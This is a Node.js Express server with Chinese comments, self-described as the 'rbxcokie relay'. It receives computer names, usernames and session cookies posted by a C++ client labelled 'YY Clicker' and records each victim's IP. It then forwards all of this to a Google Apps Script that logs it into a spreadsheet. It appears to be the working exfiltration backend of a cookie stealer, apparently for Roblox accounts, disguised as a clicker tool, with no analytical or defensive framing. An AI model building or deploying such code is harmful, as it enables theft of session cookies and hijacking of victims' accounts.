/**
 * Railway 中轉伺服器
 * 
 * 功能：
 *   1. 接收來自 C++ 客戶端的 POST /api/cookie 請求
 *   2. 驗證資料格式
 *   3. 將資料轉發至 Google Apps Script Web App
 *   4. 回傳處理結果
 *
 * 環境變數（在 Railway 設定）：
 *   - GOOGLE_SCRIPT_URL : Google Apps Script 部署後的 Web App URL
 *   - PORT             : Railway 自動提供，預設 3000
 */

const express = require("express");
const fetch   = require("node-fetch");

const app  = express();
const PORT = process.env.PORT || 3000;

// Google Apps Script Web App URL（部署後填入 Railway 環境變數）
const GOOGLE_SCRIPT_URL = process.env.GOOGLE_SCRIPT_URL || "";

// ── 中介層 ──────────────────────────────────────────────────────────
app.use(express.json({ limit: "1mb" }));

// CORS — 允許所有來源（客戶端是 Win32 原生程式，非瀏覽器）
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ── 健康檢查 ────────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({
    status: "ok",
    message: "rbxcokie relay server is running",
    timestamp: new Date().toISOString()
  });
});

app.get("/health", (req, res) => {
  res.json({ status: "ok" });
});

// ── 主要端點：接收 Cookie 資料 ──────────────────────────────────────
app.post("/api/cookie", async (req, res) => {
  try {
    const { computer_name, username, cookie, source } = req.body;

    // 基本驗證
    if (!cookie || cookie.length < 20) {
      return res.status(400).json({
        status: "error",
        message: "Cookie 資料無效或過短"
      });
    }

    // 取得客戶端 IP
    const clientIP = req.headers["x-forwarded-for"]
      || req.connection.remoteAddress
      || "unknown";

    // 組裝轉發資料
    const payload = {
      computer_name: computer_name || "N/A",
      username:      username      || "N/A",
      cookie:        cookie,
      ip:            clientIP,
      source:        source        || "YY Clicker",
      timestamp:     new Date().toISOString()
    };

    console.log(`[${new Date().toISOString()}] 收到 Cookie 資料 — 電腦: ${payload.computer_name}, 使用者: ${payload.username}, IP: ${clientIP}`);

    // 轉發至 Google Apps Script
    if (!GOOGLE_SCRIPT_URL) {
      console.error("GOOGLE_SCRIPT_URL 未設定！");
      return res.status(500).json({
        status: "error",
        message: "伺服器未設定 Google Script URL"
      });
    }

    const gsResponse = await fetch(GOOGLE_SCRIPT_URL, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(payload),
      redirect: "follow"   // Google Apps Script 會 302 重導向
    });

    const gsResult = await gsResponse.text();
    let gsJson;
    try {
      gsJson = JSON.parse(gsResult);
    } catch {
      gsJson = { raw: gsResult };
    }

    console.log(`[${new Date().toISOString()}] Google Script 回應:`, gsJson);

    return res.json({
      status: "ok",
      message: "資料已成功轉發至 Google 試算表",
      google_response: gsJson
    });

  } catch (err) {
    console.error(`[${new Date().toISOString()}] 錯誤:`, err.message);
    return res.status(500).json({
      status: "error",
      message: err.message
    });
  }
});

// ── 啟動伺服器 ──────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`[rbxcokie relay] 伺服器已啟動，監聽 port ${PORT}`);
  console.log(`[rbxcokie relay] GOOGLE_SCRIPT_URL = ${GOOGLE_SCRIPT_URL ? "已設定" : "⚠ 未設定"}`);
});
